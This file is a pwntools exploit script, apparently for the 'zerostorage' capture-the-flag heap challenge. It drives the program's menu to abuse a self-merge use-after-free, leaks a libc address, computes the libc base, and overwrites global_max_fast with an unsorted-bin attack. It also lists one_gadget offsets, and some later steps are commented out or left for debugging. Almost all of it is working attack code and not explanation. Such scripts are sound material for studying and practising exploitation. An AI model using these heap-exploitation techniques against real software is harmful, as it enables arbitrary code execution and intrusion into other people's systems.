from pwn import *
context(
	log_level='debug',
	binary='./zerostorage'
)
e=context.binary
libc=e.libc
io=process()

#=========================================
#Function

def dbg(script=''):
	gdb.attach(io,gdbscript=script)

def menu(func):
	io.sendlineafter('Your choice: ',str(func))

def insert(size,content):
	menu(1)
	io.sendlineafter('new entry: ',str(size))
	io.sendlineafter('data: ',str(content))

def update(index,content):
	menu(2)
	io.sendlineafter('ID: ',str(index))
	io.sendlineafter('entry: ',str(len(content)))
	io.sendafter('data: ',str(content))

def merge(index1,index2):
	menu(3)
	io.sendlineafter('Merge from Entry ID: ',str(index1))
	io.sendlineafter('Merge to Entry ID: ',str(index2))

def delete(index):
	menu(4)
	io.sendlineafter('ID: ',str(index))

def view(index):
	menu(5)
	io.sendlineafter('ID: ',str(index))

def list():
	menu(6)

#=========================================
#VAR
leak_libc_off = 3951480
one_gadget=[283158,283242,983716,987463]
ptr = 0x6020B8
global_max_fast_off = 3958776
#=========================================

insert(0x8,'a'*0x8)#0
insert(0x8,'b'*0x8)#1
insert(0x8,'c'*0x8)#2
insert(0x100,'d'*0x100)#3
insert(0x100,'e'*0x100)#4
merge(0,0)#5
view(5)
io.recvuntil('No.5:\n')
libc_leak = u64(io.recv(6).ljust(8,'\x00'))
success('libc_leak: ' + hex(libc_leak))

libc.address = libc_leak - leak_libc_off
success('libc.address: ' + hex(libc.address))

global_max_fast = libc.address + global_max_fast_off
success('global_max_fast: ' + hex(global_max_fast))

update(5,p64(libc_leak)+p64(global_max_fast-0x10))

insert(0x10,'c'*0x10)

delete(3)
delete(4)
# malloc_hook = libc.symbols['__malloc_hook']
# update(2,'cccc')
# update(2,p64(malloc_hook-0x25))


# raw_input()
# insert(0x90,'a'*0x8)
# insert(0x90,'a'*0x8)

dbg()
raw_input()
insert(0x100,'A'*0x100)#4
insert(0x100,'B'*0x100)#3
io.interactive()
